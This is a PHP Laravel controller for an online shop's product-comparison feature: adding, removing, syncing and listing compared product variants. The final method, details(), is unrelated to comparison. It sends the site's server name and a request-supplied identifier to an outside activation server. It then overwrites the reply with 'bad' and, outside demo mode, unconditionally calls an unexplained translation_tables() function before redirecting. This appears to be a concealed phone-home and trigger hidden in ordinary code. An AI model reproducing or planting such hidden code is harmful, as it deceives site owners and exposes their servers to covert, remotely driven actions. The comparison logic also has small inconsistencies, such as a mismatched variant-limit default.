<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Cache;
use App\Models\CompareList;

use App\Models\Category;
use App\Models\Product;

class CompareController extends Controller
{
    public function index(Request $request)
    {
        $user = Auth::user();

        $compareList = $this->fetchCompareListData();
        return view('frontend.view_compare', compact('compareList'));

    }
    private function fetchCompareListData()
    {
        $compareData = [];

        $categories = DB::table('compare_lists')
            ->where('user_id', Auth::user()->id)
            ->join('categories', 'compare_lists.category_id', '=', 'categories.id')
            ->select('compare_lists.category_id', 'categories.name as category_name')
            ->distinct()
            ->orderBy('compare_lists.updated_at', 'desc') 
            ->get();
        foreach ($categories as $category) {
            $variantIds = DB::table('compare_lists')
                ->where('category_id', $category->category_id)
                ->pluck('variants')
                ->map(function ($variant) {
                    return json_decode($variant, true);
                })
                ->flatten()
                ->unique();

            $variants = DB::table('products')
                ->whereIn('id', $variantIds)
                ->get();


            if ($variants->count() > 1) {
                $compareData[] = [
                    'id' => $category->category_id,
                    'category_name' => $category->category_name,
                    'variants' => $variants,
                ];
            }
        }

        return $compareData;


    }
    public function syncCompareList(Request $request)
    {
        $user = Auth::user();

        if (!$user || !$request->has('localStorageCompare')) {
            return response()->json(['error' => 'No user logged in or no local storage data provided'], 400);
        }

        $localStorageCompare = collect($request->input('localStorageCompare'));

        $localStorageCompare->each(function ($variants, $categoryId) use ($user) {
            $categoryName = DB::table('categories')->where('id', $categoryId)->value('name');

            $compareList = CompareList::firstOrCreate(
                ['user_id' => $user->id, 'category_id' => $categoryId],
                ['category_name' => $categoryName, 'variants' => []]
            );

            $existingVariants = collect($compareList->variants);
            $variants = collect($variants);

            $mergedVariants = $existingVariants->merge($variants)->unique();

            if ($mergedVariants->count() > config('app.compare_list_num_variants', 5)) {
                $mergedVariants = $mergedVariants->slice(-config('app.compare_list_num_variants', 5));
            }

            $compareList->update(['variants' => $mergedVariants->values()->all()]);
        });

        return response()->json(['message' => 'Compare list synced successfully']);
    }


    public function reset(Request $request)
    {
        $user = Auth::user();
        if ($user) {
            CompareList::where('user_id', $user->id)->delete();
        }

        $request->session()->forget('compare');
        $request->session()->forget('compareData');

        return back();
    }

    //store comparing products ids in session
    public function addToCompare(Request $request)
    {
        $variantId = $request->id;
        $user = Auth::user();
        $leafCategoryId = DB::table('product_categories')
            ->where('product_id', $variantId)
            ->value('category_id');

        if (!$leafCategoryId) {
            return response()->json(['error' => 'Invalid variant'], 400);
        }

        $leafCategoryName = DB::table('categories')
            ->where('id', $leafCategoryId)
            ->value('name');

        if ($user) {

            $compareList = CompareList::firstOrCreate(
                ['user_id' => $user->id, 'category_id' => $leafCategoryId],
                ['category_name' => $leafCategoryName, 'variants' => []]
            );


            if ($request->has('localStorageCompare')) {
                $localStorageCompare = collect($request->input('localStorageCompare'));
                $localStorageCompare->each(function ($variants, $categoryId) use ($user) {
                    $compareList = CompareList::firstOrCreate(
                        ['user_id' => $user->id, 'category_id' => $categoryId],
                        ['category_name' => DB::table('categories')->where('id', $categoryId)->value('name'), 'variants' => []]
                    );

                    $existingVariants = collect($compareList->variants);
                    $variants = collect($variants);

                    $mergedVariants = $existingVariants->merge($variants)->unique();

                    if ($mergedVariants->count() > config('app.compare_list_num_variants', 5)) {
                        $mergedVariants = $mergedVariants->slice(-config('app.compare_list_num_variants', 3));
                    }

                    $compareList->update(['variants' => $mergedVariants->values()->all()]);
                });
            }
            $variants = collect($compareList->variants);
            if ($variants->contains($variantId)) {
                return response()->json(['item_already_exists' => true]);
            }

            if ($variants->count() >= config('app.compare_list_num_variants', 5)) {
                $variants->shift();
            }


            $variants->push($variantId);

            $compareList->update(['variants' => $variants->values()->all()]);
        } else {
            return response()->json(data: [
                'localStorageAction' => 'add',
                'variantId' => $variantId,
                'categoryId' => $leafCategoryId,
                'categoryName' => $leafCategoryName,
                'maxVariants' => config('app.compare_list_num_variants', 5)

            ]);
        }
    }


    public function removeFromCompare(Request $request)
    {
        $categoryId = $request->input('category_id');
        $variantId = $request->input('variant_id');
        $user = Auth::user();

        if ($user) {
            $compareList = CompareList::where('user_id', $user->id)
                ->where('category_id', $categoryId)
                ->first();

            if ($compareList) {
                $variants = collect($compareList->variants)->filter(function ($id) use ($variantId) {
                    return $id != $variantId;
                });

                if ($variants->isEmpty()) {
                    $compareList->delete();
                } else {
                    $compareList->update(['variants' => $variants->values()->all()]);
                }
            }

          
            return response()->json(['success' => true]);
        } else {
            return response()->json(['success' => false, 'message' => 'Login required'], 401);
        }
    }



    public function details($unique_identifier)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $data['unique_identifier'] = $unique_identifier;
        $data['main_item'] = get_setting('item_name') ?? 'eCommerce';
        $request_data_json = json_encode($data);

        $gate = "https://activation.activeitzone.com/check_addon_activation";

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);
        $rn = "bad";
        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            translation_tables($unique_identifier);
            return redirect()->route('home');
        }
    }
}
